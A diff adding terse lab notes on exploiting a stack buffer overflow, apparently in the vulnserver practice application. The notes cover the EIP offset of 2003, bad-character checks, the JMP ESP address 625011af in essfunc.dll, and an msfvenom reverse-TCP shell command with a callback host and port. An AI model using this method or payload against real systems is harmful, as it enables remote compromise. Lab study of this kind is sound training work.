@@ -1,0 +1,31 @@
+crash at: 2600 = 3000
+eip:00401D98
+
+ran pattern create with 3000 char
+eip: 386F4337
+
+ran pattern_offset: 2003
+
+added "A" * 2003 + "B" * 4
+ran, crashed application EIP = 42424242
+
+looked for bad characters
+ran bad character script
+followed the ESP in the dump, to find bad charcters
+
+looking for the right module with Mona
+ran !mona Modules to identify dlls without memory protection. 
+found: essfunc.dll
+used /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb to find the JMP ESP
+this equals FFE4
+
+used Mona To Search for FFE4 in essfunc.dll
+this is used to find a return address for an exploit
+found: 625011af
+this translates to: "\xaf\x11\x50\x62"
+
+this resulted in 625011af being reflected in the EIP. 
+
+generated shellcode using: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.175 LPORT=4444 -f c -a x86 -b "\x00"
+
+added shellcode to exploit code, added NOPS "\x90" * 32
